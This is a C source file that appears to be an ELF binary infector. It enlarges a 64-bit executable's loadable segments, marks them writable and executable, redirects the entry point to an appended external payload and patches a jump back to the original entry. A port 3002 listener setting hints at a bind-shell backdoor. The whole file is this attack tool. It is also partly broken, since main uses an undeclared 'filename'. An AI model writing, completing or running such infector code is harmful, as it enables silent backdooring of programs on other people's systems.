#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <elf.h>

#ifdef __APPLE__
#define CDECL_NORM(x) x
#else
#define CDECL_NORM(x) _ ## x
#endif /* __APPLE__ */

extern uint8_t CDECL_NORM(payload);
extern uint64_t CDECL_NORM(payload_size);

#define payload_p &CDECL_NORM(payload)
#define payload_size_p CDECL_NORM(payload_size)

uint16_t port = 0;
uint32_t addr_ip = 0;

void insert_executable_section(const char *elf_filename) {
    FILE *file = fopen(elf_filename, "rb+");
    if (!file) {
        perror("fopen");
        exit(EXIT_FAILURE);
    }

    // Read the ELF header
    Elf64_Ehdr ehdr;
    fread(&ehdr, sizeof(Elf64_Ehdr), 1, file);

    // Read the program headers
    Elf64_Phdr *phdrs = malloc(ehdr.e_phnum * sizeof(Elf64_Phdr));
    fseek(file, ehdr.e_phoff, SEEK_SET);
    fread(phdrs, sizeof(Elf64_Phdr), ehdr.e_phnum, file);

    // Calculate the offset and address for the new section
    Elf64_Off new_section_offset = 0;
    Elf64_Addr new_section_addr = 0;
    for (int i = 0; i < ehdr.e_phnum; ++i) {
        if (phdrs[i].p_type == PT_LOAD) {
            new_section_offset = phdrs[i].p_offset + phdrs[i].p_filesz;
            new_section_addr = phdrs[i].p_vaddr + phdrs[i].p_memsz;
            phdrs[i].p_filesz += payload_size_p;
            phdrs[i].p_memsz += payload_size_p;
            phdrs[i].p_flags |= PF_X | PF_W | PF_R;
        }
    }

    // Modify the entry point
    Elf64_Addr old_entry_point = ehdr.e_entry;
    ehdr.e_entry = new_section_addr;

    // Write the modified ELF header
    fseek(file, 0, SEEK_SET);
    fwrite(&ehdr, sizeof(Elf64_Ehdr), 1, file);

    // Write the modified program headers
    fseek(file, ehdr.e_phoff, SEEK_SET);
    fwrite(phdrs, sizeof(Elf64_Phdr), ehdr.e_phnum, file);

    // Create the payload with a jump to the old entry point at the end
    size_t jump_offset = payload_size_p - 1190 - 4;
    *(Elf64_Addr *)(payload_p + jump_offset) = old_entry_point;

    // Write the new section
    fseek(file, new_section_offset, SEEK_SET);
    fwrite(payload_p, 1, payload_size_p, file);

    fclose(file);
    free(phdrs);
}

int main(int argc, char *argv[], char *envp[]) {
    port = htons(3002);
    addr_ip = htonl(INADDR_ANY);
    printf("port: %#x %#x\n", port, addr_ip);

    insert_executable_section(filename);

    return 0;
}
